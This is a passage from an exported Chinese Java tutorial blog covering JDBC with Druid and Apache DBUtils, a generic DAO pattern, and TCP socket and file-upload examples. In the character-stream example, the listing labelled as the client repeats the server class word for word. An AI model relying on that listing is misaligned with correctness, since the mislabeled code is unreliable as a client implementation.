System.out.println(connection.getClass());//运行类型com.alibaba.druid.pool.DruidPooledConnection\n            preparedStatement = connection.prepareStatement(sql);\n            preparedStatement.setInt(1, 1);//给?号赋值\n            //执行, 得到结果集\n            set = preparedStatement.executeQuery();\n            //遍历该结果集\n            while (set.next()) {\n                int id = set.getInt(\"id\");\n                String name = set.getString(\"name\");//getName()\n                String password = set.getString(\"password\");//getSex()\n                Date birthday = set.getDate(\"birthday\");\n                //把得到的resultset 的记录，封装到User 对象，放入到list 集合\n                list.add(new User(id, name, password, birthday));\n            }\n            System.out.println(\"list集合数据=\" + list);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } finally {\n            //关闭资源\n            JDBCUtilsByDruid.close(set, preparedStatement, connection);\n        }\n        //因为ArrayList 和connection 没有任何关联，所以该集合可以复用.\n        for (User user : list) {\n            System.out.println(\"id=\" + user.getId() + \"\\t\" + \"name=\" + user.getName());\n        }\n    }\n}\n```\n\nUser.java\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport java.util.Date;\n\npublic class User { //JavaBean，POJO，Domain\n    private Integer id;//使用包装类原因后面说\n    private String name;\n    private String password;\n    private Date birthday;\n\n    public User() {\n    }\n\n    public User(Integer id, String name, String password, Date birthday) {\n        this.id = id;\n        this.name = name;\n        this.password = password;\n        this.birthday = birthday;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public Date getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(Date birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nUser{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\n#### Apache-DBUtils解决\n\n##### 介绍\n\ncommons- dbutils 是 Apache 组织提供的一个开源JDBC工具类库，它是对JDBC的封装，使用dbutils能极大简化jdbc编码的工作量。\n\nDbUtils类\n\n1. QueryRunner类:该类封装了SQL的执行，是线程安全的。可以实现增、删、改、查、批处理\n2. 使用QueryRunner类实现查询\n3. ResultSetHandler接口:该接口用于处理java.sql.ResultSet,将数据按要求转换为另种形式，\n\nArrayHandler: 把结果集中的第一行数据转成对象数组。\nArrayListHandler:把结果集中的每一行数据都转成一个数组， 再存放到List中。\nBeanHandler:将结果集中的第一行数据封装到一个对应的JavaBean实例中。\nBeanListHandler:将结果集中的每一行数据都封装到一个对应的JavaBean实例中，存放到List里。\nColumnListHandler:将结果集中某一列的数据存放到List中。\nKeyedHandler(name): 将结果集中的每行数据都封装到Map里， 再把这些map再存到一个map里，其key为指定的key。\nMapHandler:将结果集中的第一行数据封装到一个Map里，key是列名，value就是对应的值。\nMapListHandler:将结果集中的每一行数据都封装到一个Map里，然后再存放到List\n\n##### DBUtils +Druid对表crud\n\n**准备工作：**使用DBUtils 类和接口, 先引入DBUtils 相关的 jar , 加入到本Project\n\n1、使用apache-DBUtils 工具类+ druid 完成返回的结果是**多行记录**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    //使用apache-DBUtils 工具类+ druid 完成对表的crud 操作\n    @Test\n    public void testQueryMany() throws SQLException {\n        //1. 得到连接(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. 创建QueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. 就可以执行相关的方法，返回ArrayList 结果集\n        String sql = \"select * from user where id >= ?\";\n        // 注意: sql 语句也可以查询部分列\n        //String sql = \"select id, name from user where id >= ?\";\n        // 老韩解读\n        //(1) query 方法就是执行sql 语句，得到resultset ---封装到--> ArrayList 集合中,再返回集合\n        //(2) connection: 连接\n        //(3) sql : 执行的sql 语句\n        //(4) new BeanListHandler<>(User.class): 在将resultset -> User 对象-> 封装到ArrayList\n        // 底层使用反射机制去获取User 类的属性，然后进行封装\n        //(5) 1 就是给sql 语句中的? 赋值，可以有多个值，因为是可变参数Object... params\n        //(6) 底层得到的resultset ,会在query 关闭, 关闭PreparedStatment\n        List<User> list = queryRunner.query(connection, sql, new BeanListHandler<>(User.class), 1);\n        System.out.println(\"list集合数据=\" + list);\n        System.out.println(\"输出集合的信息\");\n        for (User user : list) {\n            System.out.print(user);\n        }\n        //释放资源\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n2、使用apache-DBUtils 工具类+ druid 完成返回的结果是**单行记录(单个对象)**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    \n    //演示apache-dbutils + druid 完成返回的结果是单行记录(单个对象)\n    @Test\n    public void testQuerySingle() throws SQLException {\n        //1. 得到连接(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. 创建QueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. 就可以执行相关的方法，返回单个对象\n        String sql = \"select * from user where id = ?\";\n        // 因为我们返回的单行记录<--->单个对象, 使用的Hander 是BeanHandler\n        User user = queryRunner.query(connection, sql, new BeanHandler<>(User.class), 2);\n        System.out.println(user);\n        // 释放资源\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n3、使用apache-DBUtils 工具类+ druid 完成返回的结果是**单行单列(object)**\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n\n    //演示apache-dbutils + druid 完成查询结果是单行单列(object)\n    @Test\n    public void testScalar() throws SQLException {\n        //1. 得到连接(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. 创建QueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //3. 就可以执行相关的方法，返回单行单列, 返回的就是Object\n        String sql = \"select name from user where id = ?\";\n        //因为返回的是一个对象, 使用的handler 就是ScalarHandler\n        Object obj = queryRunner.query(connection, sql, new ScalarHandler(), 3);\n        System.out.println(obj);\n        // 释放资源\n        JDBCUtilsByDruid.close(null, null, connection);\n        }\n}\n```\n\n4、使用apache-DBUtils 工具类+ druid 完成dml (update, insert ,delete)\n\n```java\npackage com.jwt.jdbc.datasource;\n\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class DBUtils_Use {\n    //演示apache-dbutils + druid 完成dml (update, insert ,delete)\n    @Test\n    public void testDML() throws SQLException {\n        //1. 得到连接(druid)\n        Connection connection = JDBCUtilsByDruid.getConnection();\n        //2. 使用DBUtils 类和接口, 先引入DBUtils 相关的jar , 加入到本Project\n        //3. 创建QueryRunner\n        QueryRunner queryRunner = new QueryRunner();\n        //4. 这里组织sql 完成update, insert delete\n        //String sql = \"update user set name = ? where id = ?\";\n        String sql = \"insert into user values(null, ?, ?, ?)\";//id为自增长\n        //String sql = \"delete from user where id = ?\";\n        //(1) 执行dml 操作是queryRunner.update()\n        //(2) 返回的值是受影响的行数(affected: 受影响)\n        //int affectedRow = queryRunner.update(connection,sql,Tom2,2);\n        int affectedRow = queryRunner.update(connection, sql, \"jianjian\", \"789\", \"2000-10-10\");\n        //int affectedRow = queryRunner.update(connection, sql, 3);\n        System.out.println(affectedRow > 0 ? \"执行成功\" : \"执行没有影响到表\");\n        // 释放资源\n        JDBCUtilsByDruid.close(null, null, connection);\n    }\n}\n```\n\n#### 数据表和JavaBean的数据类型映射\n\nint、double等在Java中都用包装类,因为mysql中的所有类型都可能是NULL,而Java只有引用数据类型才有\nNULL值\n\n![](https://img.jwt1399.top/img/image-20220222142620080.png)\n\n### 12.BasicDAO\n\n#### 问题引出\n\napache dbutils+ Druid简化了JDBC开发，但还有不足:\n\n- 1、SQL 语句是固定，不能通过参数传入，通用性不好，需要改得更方便执行增删改查\n- 2、对于 select 操作，如果有返回值返回类型不能固定，需要使用泛型\n- 3、将来的表很多，业务需求复杂，不可能只靠一个Java类完成\n\n#### DAO介绍\n\nDAO：data access objects 数据访问对象\n\n- 通用类，称为BasicDao，是其他Dao的父类，是专门和数据库交互的，即完成对数据库(表)的crud 操作。\n- 在BaiscDao的基础上，实现一张表对应一个Dao，更好的完成功能，比如Customer表-\n  Customer.java(javabean)-CustomerDao.java\n\n### 13.BasicDao实例\n\n**文件列表**\n\n- com.jwt.dao_.utils //工具类\n- com.jwt.dao\\_.domain //javabean\n- com.jwt.dao\\_.dao //存放XxxDAO和BasicDAO\n- com.jwt.dao\\_.test //写测试类\n\n#### com.jwt.dao_.utils\n\n##### JDBCUtilsByDruid.java\n\n```java\npackage com.jwt.dao_.utils;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class JDBCUtilsByDruid {\n    private static DataSource ds;\n    //在静态代码块完成ds 初始化\n    static {\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"src//druid.properties\"));\n            ds = DruidDataSourceFactory.createDataSource(properties);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    //编写getConnection 方法\n    public static Connection getConnection() throws SQLException {\n        return ds.getConnection();\n    }\n    //关闭连接, 强调：在数据库连接池技术中，close 不是真的断掉连接\n    //而是把使用的Connection 对象放回连接池\n    public static void close(ResultSet resultSet, Statement statement, Connection connection) {\n        try {\n            if (resultSet != null) {\n                resultSet.close();\n            }\n            if (statement != null) {\n                statement.close();\n            }\n            if (connection != null) {\n                connection.close();\n            }\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n\n```\n\n#### com.jwt.dao\\_.domain\n\n##### User.java\n\n```java\npackage com.jwt.dao_.domain;\n\nimport java.util.Date;\n\npublic class User { //Javabean，POJO，Domain\n    private Integer id;\n    private String name;\n    private String password;\n    private Date birthday;\n\n    public User() {\n    }\n\n    public User(Integer id, String name, String password, Date birthday) {\n        this.id = id;\n        this.name = name;\n        this.password = password;\n        this.birthday = birthday;\n    }\n\n    public Integer getId() {\n        return id;\n    }\n\n    public void setId(Integer id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n\n    public void setPassword(String password) {\n        this.password = password;\n    }\n\n    public Date getBirthday() {\n        return birthday;\n    }\n\n    public void setBirthday(Date birthday) {\n        this.birthday = birthday;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nUser{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                \", password='\" + password + '\\'' +\n                \", birthday=\" + birthday +\n                '}';\n    }\n}\n```\n\n#### com.jwt.dao_.dao\n\n##### BasicDAO.java\n\n```java\npackage com.jwt.dao_.dao;\n\nimport com.jwt.dao_.utils.JDBCUtilsByDruid;\nimport org.apache.commons.dbutils.QueryRunner;\nimport org.apache.commons.dbutils.handlers.BeanHandler;\nimport org.apache.commons.dbutils.handlers.BeanListHandler;\nimport org.apache.commons.dbutils.handlers.ScalarHandler;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.util.List;\n\npublic class BasicDAO<T> { //泛型指定具体类型\n\n    private QueryRunner qr = new QueryRunner();\n\n    //开发通用的dml，针对任意表\n    public int update(String sql,Object... parameters){\n        Connection connection =null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            int update = qr.update(connection,sql,parameters);\n            return update;\n        } catch (SQLException e) {\n            throw new RuntimeException(); //将编译异常转化为运行异常\n        } finally {\n            JDBCUtilsByDruid.close(null,null,connection);\n        }\n\n\n    }\n\n    /**\n     *\n     * @param sql sql 语句，可以有?\n     * @param clazz 传入一个类的Class 对象比如User.class\n     * @param parameters 传入? 的具体的值，可以是多个\n     * @return 根据User.class 返回对应的ArrayList 集合\n     */\n\n    //查询多行结果的通用方法\n    public List<T> queryMulti(String sql,Class<T> clazz,Object... parameters){\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new BeanListHandler<T>(clazz), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n    //查询单行结果的通用方法\n    public T querySingle(String sql, Class<T> clazz, Object... parameters) {\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new BeanHandler<T>(clazz), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e); //将编译异常->运行异常,抛出\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n    //查询单行单列的通用方法\n    public Object queryScalar(String sql, Object... parameters) {\n        Connection connection = null;\n        try {\n            connection = JDBCUtilsByDruid.getConnection();\n            return qr.query(connection, sql, new ScalarHandler<>(), parameters);\n        } catch (SQLException e) {\n            throw new RuntimeException(e);\n        } finally {\n            JDBCUtilsByDruid.close(null, null, connection);\n        }\n    }\n\n}\n```\n\n##### UserDAO.java\n\n```java\npackage com.jwt.dao_.dao;\n\nimport com.jwt.jdbc.datasource.User;\n\npublic class UserDAO extends BasicDAO<User> {\n    //1. 有BasicDAO 的方法\n    //2. 根据业务需求，可以编写特有的方法.\n\n}\n```\n\n#### com.jwt.dao\\_.test\n\n##### TestDAO.java\n\n```java\npackage com.jwt.dao_.test;\n\nimport com.jwt.dao_.dao.UserDAO;\nimport com.jwt.jdbc.datasource.User;\nimport org.junit.Test;\n\nimport java.util.List;\n\n\npublic class TestDAO {\n\n    ////测试UserDAO 对user 表crud 操作\n    @Test\n    public void testUserDAO(){\n        UserDAO userDAO = new UserDAO();\n        //1.查询多行记录\n        List<User> users = userDAO.queryMulti(\"select * from user where id >=?\", User.class, 1);\n        System.out.println(\"===查询结果===\");\n        for (User user : users){\n            System.out.println(user);\n        }\n\n        //2.查询单行记录\n        User user = userDAO.querySingle(\"select * from user where id =?\", User.class, 2);\n        System.out.println(\"===查询结果===\");\n        System.out.println(user);\n\n        //3.查询单行单列\n        Object o = userDAO.queryScalar(\"select name from user where id =?\", 3);\n        System.out.println(\"===查询结果===\");\n        System.out.println(o);\n\n        //4.dml操作\n        int update = userDAO.update(\"insert into user values (null,?,?,?)\", \"pyj\", \"135\", \"2000-01-01\");\n        System.out.println(update > 0 ? \"执行成功\":\"执行没有影响表\");\n    }\n\n}\n```\n\n\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n## 参考\n\n- [JDBC教程™ (yiibai.com)](https://www.yiibai.com/jdbc)\n\n- [【韩顺平讲JDBC】快速掌握JDBC](https://www.bilibili.com/video/BV1zv41157NC)\n\n##  Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JDBC","数据库"],"categories":["JavaSE"]},{"title":"Java-网络编程","url":"/posts/43348.html","content":"\n##  前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-网络编程》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计5天更新完\n- [x] 🎯开始时间：03-04\n- [x] 🎉结束时间：03-06\n- [x] 🍀总结：用时 3 天，提前两天完成任务，继续下一个 🚩\n\n##  网络基础\n\n### 简介\n\n- 网络：两台或多台设备通过一定物理设备连接起来构成了网络\n- 网络通信：将数据通过网络从一台设备传输到另一台设备\n\n- TCP协议: 传输控制协议\n  - 1.使用TCP协议前，须先建立TCP连接，形成传输数据通道\n  - 2.传输前，采用\"三次握手\"方式，是**可靠的**\n  - 3.TCP协议进行通信的两个应用进程:客户端、服务端\n  - 4.在连接中可进行大数据量的传输\n  - 5.传输完毕，需释放已建立的连接，**效率低**\n- UDP协议: 用户数据协议\n  - 1.将数据、源、目的封装成数据包，不需要建立连接\n  - 2.因无需连接，故是**不可靠的**\n  - 2.每个数据报的大小限制在64K内，不适合传输大量数据\n  - 4.发送数据结束时无需释放资源(因为不是面向连接的)，**速度快**\n\n### Java提供的网络功能类\n\n- **InetAddress**： 用于标识网络上的硬件资源\n- **Socket和ServerSocket**： 使用TCP协议实现网络通信的 Socket 相关的类\n- **Datagram**： 使用UDP协议，将数据保存在数据报中，通过网络进行通信\n\n## InetAddress\n\n- getLocalHost() 获取本机 InetAddress 对象\n- getByName() 根据指定主机名/域名获取 ip 地址对象\n- getHostName() 获取 InetAddress 对象的主机名\n- getHostAddress() 获取 InetAddress 对象的地址\n\n```java\npackage com.jwt.network;\n\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class InetAddress_ {\n    public static void main(String[] args) throws UnknownHostException {\n        //获取本机InetAddress 对象\n        InetAddress localHost = InetAddress.getLocalHost();\n        System.out.println(localHost);\n        //根据指定主机名/域名获取对象\n        InetAddress host2 = InetAddress.getByName(\"jianjian\");\n        System.out.println(host2);\n        InetAddress host3 = InetAddress.getByName(\"www.baidu.com\");\n        System.out.println(host3);\n        //获取InetAddress对象的主机名\n        String host3Name = host3.getHostName();\n        System.out.println(host3Name);\n        //获取InetAddress对象的地址\n        String host3Address = host3.getHostAddress();\n        System.out.println(host3Address);\n    }\n}\n\n/**\njianjian/192.168.50.204\njianjian/192.168.50.204\nwww.baidu.com/14.215.177.39\nwww.baidu.com\n14.215.177.39\n**/\n```\n\n## Socket\n\n### 简介\n\n1. 套接字(Socket)开发网络应用程序被广泛采用，以至于成为事实上的标准。\n2. 通信的两端都要有Socket，是两台机器间通信的端点。\n3. 网络通信其实就是 Socket 间的通信。\n4. Socket 允许程序把网络连接当成一个流，数据在两个 Socket 间通过 IO 传输。\n5. 一般主动发起通信的应用程序属客户端，等待通信请求的为服务端。\n\n## TCP编程\n\n### 简介\n\n- 1.基于客户端-服务端的网络通信\n- 2.底层使用的是TCP/IP协议\n- 3.应用场景举例:客户端发送数据，服务端接受并显示控制台\n\n| ![](https://img.jwt1399.top/img/image-20220305162250044.png) | ![](https://img.jwt1399.top/img/37360672.jpg) |\n| ------------------------------------------------------------ | --------------------------------------------- |\n\n\n### 流程\n\nTCP，传输前先开服务端，accept，等客户端接入，然后获得客户端 socket 然后进行 IO 操作\n\n#### 服务端编写\n\n- **Step 1**：创建ServerSocket对象，绑定监听的端口\n  -  ServerSocket serverSocket = new ServerSocket(Port);\n- **Step 2**：调用accept()方法监听客户端的请求\n  - Socket socket = serverSocket.accept();\n- **step 3**：连接建立后，通过输入流读取客户端发送的请求信息\n  - InputStream inputStream = socket.getInputStream();\n- **Step 4**：通过输出流向客户端发送响应信息\n  - OutputStream outputStream = socket.getOutputStream();\n- **Step 5**：关闭相关资源\n  - outputStream.close();\n  - inputStream.close();\n  - socket.close();\n  - serverSocket.close();\n\n#### 客户端编写\n\n- **Step 1**：创建Socket对象，指明需要链接的服务器的地址和端号\n  - Socket socket = new Socket(\"server address\", port);\n\n- **Step 2**：链接建立后，通过输出流向服务器发送请求信息\n  -  OutputStream outputStream = socket.getOutputStream();\n\n- **Step 3**：通过输入流获取服务器响应的信息\n  - InputStream inputStream = socket.getInputStream();\n\n- **Step 4**：关闭相关资源\n  - inputStream.close();\n  - outputStream.close();\n  - socket.close();\n\n\n### 例子1:使用字节流通信\n\n- 1.编写一个服务器端和一个客户端\n- 2.服务器端监听 9999 端口\n- 3.客户端连接到服务器端， 发送\"你好，服务端！\"，并接收服务器端回发的\"你好，客户端！\"，再退出\n- 4.服务器端接收到客户端发送的信息，输出，并发送\"你好，客户端！\", 再退出\n\n#### **服务端**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP01Server {\n    public static void main(String[] args) throws IOException {\n         //1. 监听本机的9999 端口, 等待连接\n        // 细节: 要求在本机没有其它服务在监听9999\n        // 细节：这个ServerSocket 可以通过accept() 返回多个Socket[多个客户端连接服务器的并发]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"我是服务端，正在监听9999端口，等待连接...\");\n        //2. 当没有客户端连接9999 端口时，程序会阻塞, 等待连接\n        // 如果有客户端连接，则会返回Socket 对象，程序继续\n        Socket socket = serverSocket.accept();\n        System.out.println(\"服务端socket=\" + socket.getClass());\n        //3. 通过输入流，读取客户端写入到数据通道的数据, 显示\n        InputStream inputStream = socket.getInputStream();\n        //4. IO 读取\n        byte[] buf = new byte[1024];\n        int readLen = 0;\n        while ((readLen=inputStream.read(buf))!= -1) {\n            System.out.println(new String(buf,0,readLen));\n        }\n        //5. 通过输出流，写入数据到数据通道\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(\"服务端说：你好，客户端！\".getBytes());\n        // 设置结束标记\n        socket.shutdownOutput();\n        //6.关闭流和socket\n        outputStream.close();\n        inputStream.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出.....\");\n    }\n}\n```\n\n#### **客户端**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\n\npublic class SocketTCP01Client {\n    public static void main(String[] args) throws IOException {\n        //1. 连接服务端(ip , 端口）如果连接成功，返回Socket 对象\n        Socket socket = new Socket(InetAddress.getLocalHost(), 9999);\n        System.out.println(\"客户端socket返回=\" + socket.getClass());\n        //2. 连接上后，生成Socket, 通过socket.getOutputStream()\n        OutputStream outputStream = socket.getOutputStream();\n        //3. 通过输出流，写入数据到数据通道\n        outputStream.write(\"客户端说：你好，服务端!\".getBytes());\n        // 设置结束标记\n        socket.shutdownOutput();\n        //4. 获取和socket 关联的输入流. 读取数据(字节)，并显示\n        InputStream inputStream = socket.getInputStream();\n        byte[] buf = new byte[1024];\n        int readLen = 0;\n        while ((readLen=inputStream.read(buf))!= -1) {\n            System.out.println(new String(buf,0,readLen));\n        }\n\n        //5. 关闭流对象和socket, 必须关闭\n        inputStream.close();\n        outputStream.close();\n        socket.close();\n        System.out.println(\"客户端退出.....\");\n    }\n}\n```\n\n### 例子2:使用字符流通信\n\n- 1.编写一个服务端和一个客户端\n- 2.服务端在9999端口监听\n- 3.客户端连接到服务端，发送\"你好，服务端！\"，并接收服务端回发的\"你好，客户端！\"，再退出\n- 4.服务端接收到客户端发送的信息，输出，并发送\"你好，客户端！\"，再退出\n\n#### **服务端**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP02Server {\n    public static void main(String[] args) throws IOException {\n         //1. 监听本机的9999 端口, 等待连接\n        // 细节: 要求在本机没有其它服务在监听9999\n        // 细节：这个ServerSocket 可以通过accept() 返回多个Socket[多个客户端连接服务器的并发]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"我是服务端，正在监听9999端口，等待连接...\");\n        //2. 当没有客户端连接9999 端口时，程序会阻塞, 等待连接\n        // 如果有客户端连接，则会返回Socket 对象，程序继续\n        Socket socket = serverSocket.accept();\n        System.out.println(\"服务端socket=\" + socket.getClass());\n        //3. 通过socket.getInputStream() 读取客户端写入到数据通道的数据, 显示\n        InputStream inputStream = socket.getInputStream();\n        //4. IO 读取, 使用字符流, 使用InputStreamReader 将inputStream 转成字符流\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        String s = bufferedReader.readLine();\n        System.out.println(s);\n        //5. 通过输出流，写入数据到数据通道\n        OutputStream outputStream = socket.getOutputStream();\n        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));\n        bufferedWriter.write(\"服务端说：你好，客户端！\");\n        // 设置结束标记\n        bufferedWriter.newLine();// 插入一个换行符，表示回复内容的结束\n        bufferedWriter.flush();//注意需要手动的flush\n        //6.关闭流和socket\n        bufferedWriter.close();\n        bufferedReader.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出.....\");\n    }\n}\n```\n\n#### **客户端**\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class SocketTCP02Server {\n    public static void main(String[] args) throws IOException {\n         //1. 监听本机的9999 端口, 等待连接\n        // 细节: 要求在本机没有其它服务在监听9999\n        // 细节：这个ServerSocket 可以通过accept() 返回多个Socket[多个客户端连接服务器的并发]\n        ServerSocket serverSocket = new ServerSocket(9999);\n        System.out.println(\"我是服务端，正在监听9999端口，等待连接...\");\n        //2. 当没有客户端连接9999 端口时，程序会阻塞, 等待连接\n        // 如果有客户端连接，则会返回Socket 对象，程序继续\n        Socket socket = serverSocket.accept();\n        System.out.println(\"服务端socket=\" + socket.getClass());\n        //3. 通过socket.getInputStream() 读取客户端写入到数据通道的数据, 显示\n        InputStream inputStream = socket.getInputStream();\n        //4. IO 读取, 使用字符流, 使用InputStreamReader 将inputStream 转成字符流\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        String s = bufferedReader.readLine();\n        System.out.println(s);\n        //5. 通过输出流，写入数据到数据通道\n        OutputStream outputStream = socket.getOutputStream();\n        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));\n        bufferedWriter.write(\"服务端说：你好，客户端！\");\n        // 设置结束标记\n        bufferedWriter.newLine();// 插入一个换行符，表示回复内容的结束\n        bufferedWriter.flush();//注意需要手动的flush\n        //6.关闭流和socket\n        bufferedWriter.close();\n        bufferedReader.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出.....\");\n    }\n}\n```\n\n### 例子3:文件传输\n\n- 1.编写一个服务端和一个客户端\n- 2.服务器端在 8888 端口监听\n- 3.客户端连接到服务端，发送一张图片 /Users/jianjian/Downloads/a.jpeg\n- 4.服务器端接收到客户端发送的图片，保存到 src 下，发送\"收到图片\"再退出\n- 5.客户端接收到服务端发送的\"收到图片\"，再退出\n- 6.该程序要求使用 StreamUtils.java，我们直接使用\n\n![](https://img.jwt1399.top/img/image-20220306184056988.png)\n\n#### 服务端\n\n```java\npackage com.jwt.socket;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPFileUploadServer {\n    public static void main(String[] args) throws Exception {\n        //1. 服务端在本机监听8888端口\n        ServerSocket serverSocket = new ServerSocket(8888);\n        System.out.println(\"服务端监听8888端口....\");\n        //2. 等待连接\n        Socket socket = serverSocket.accept();\n        //3. 读取客户端发送的数据,通过Socket 得到输入流\n        System.out.println(\"服务端开始接收图片\");\n        BufferedInputStream bis = new BufferedInputStream(socket.getInputStream());\n        byte[] bytes = StreamUtils.streamToByteArray(bis);\n        //4. 将得到bytes 数组，写入到指定的路径，就得到一个文件了\n        String destFilePath = \"src//a.jpeg\";\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(destFilePath));\n        bos.write(bytes);\n        bos.flush();\n        System.out.println(\"服务端接收图片成功\");\n        //5.向客户端回复\"收到图片\"通过socket 获取到输出流(字符)\n        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        bw.write(\"服务端：收到图片\");\n        bw.flush();//把内容刷新到数据通道\n        socket.shutdownOutput();//设置写入结束标记\n        //6.关闭其他资源\n        bw.close();\n        bos.close();\n        bis.close();\n        socket.close();\n        serverSocket.close();\n        System.out.println(\"服务端退出.....\");\n    }\n}\n/**\n服务端监听8888端口....\n服务端开始接收图片\n服务端接收图片成功\n服务端退出.....\n**/\n```\n\n#### 客户端\n\n```java\npackage 